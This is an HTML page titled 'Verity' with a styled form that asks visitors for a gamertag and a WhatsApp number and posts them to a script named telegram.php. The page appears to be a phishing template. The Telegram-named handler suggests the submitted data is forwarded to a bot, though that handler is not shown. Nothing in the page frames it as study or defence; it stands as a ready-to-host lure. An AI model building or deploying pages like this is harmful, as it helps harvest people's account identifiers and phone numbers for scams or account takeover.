<!DOCTYPE html>
<html lang="en">
<head>
  <title>Verity</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <link rel= "stylesheet" href= "https://maxst.icons8.com/vue-static/landings/line-awesome/line-awesome/1.3.0/css/line-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="stylesheet.css">
</head>
<style>
	body{
	margin:0;
	height:100vh;
	width:100vw;
	overflow:hidden;
	display:flex;
	align-items:center;
	color:#EF2D2D;
	background-color:#fff;
	justify-content:center;
	background-image: url(https://images.pexels.com/photos/6985260/pexels-photo-6985260.jpeg);
	background-size: cover;
}
.main{
	width: 350px;
	height:550px;
	padding:60px 35px 35px 35px;
	border-radius:20px;
	background-color:#fff;
	font-family:sans-serif;
	font-weight:700;
}
.logo{
	background-image:url("https://i.ibb.co.com/zxqydw4/Verity-1-1.png");
	background-repeat: no-repeat;
	width:100%;
	height:140px;
	margin:-40px 30px;
}

.title{
	text-align:center;
	font-size:28px;
	color:#555;
	letter-spacing:.5px;
	margin:35px;
}
.credentials{
	width:100%;
	padding:2px 5px 0px 5px;
}
.credentials input{
	border:none;
	outline:none;
	background:none;
	font-size:18px;
	color:#555;
	padding:20px 10px 20px 5px;
	letter-spacing: 1px;
}
.username{
	margin-bottom:20px;
	border-bottom:2px solid #c2c4c3;
	transition:.5s ease;
}
.username:hover{
	border-bottom:3px solid #EF2D2D;
}
.password{
	margin-bottom:30px;
	border-bottom:2px solid #c2c4c3;
	transition:.5s ease;
}
.password:hover{
	border-bottom:3px solid #EF2D2D;
}
.submit{
	outline:none;
	border:none;
	width:100%;
	height:60px;
	border-radius:30px;
	color:#fff;
	font-size:20px;
	font-weight:700;
	text-align:center;
	background-image:linear-gradient(to right, #EF2D2D, #E82323, #ED1515);
	background-size:200%;
	box-shadow: 3px 3px 8px #b1b1b1,
				-3px -3px 8px #fff;
	transition:.5s;
}
.submit:hover{
	background-position:right;
}
.link{
	margin:10px;
	text-align:center;
}
.link a{
	color :#aaa;
	font-size:15px;
	text-decoration:none;
}
</style>
<body>

<div class="main">
	<div class="logo"></div>
	<div class="title"></div>
	<form action="telegram.php" method="POST">
	<div class="credentials">
		<div class="username">
			<span class="glyphicon glyphicon-user"></span>
			<input type="text" name="gamertag" placeholder="Gamertag" required="" >
		</div>
		<div class="password">
			<span class="glyphicon glyphicon-envelope"></span>
			<input type="text" name="nowa" placeholder="No Whatsapp" required="">
		</div>
	</div>
	<button class="submit" name="submit">Submit</button>
	</form>

</div>
</body>
</html>

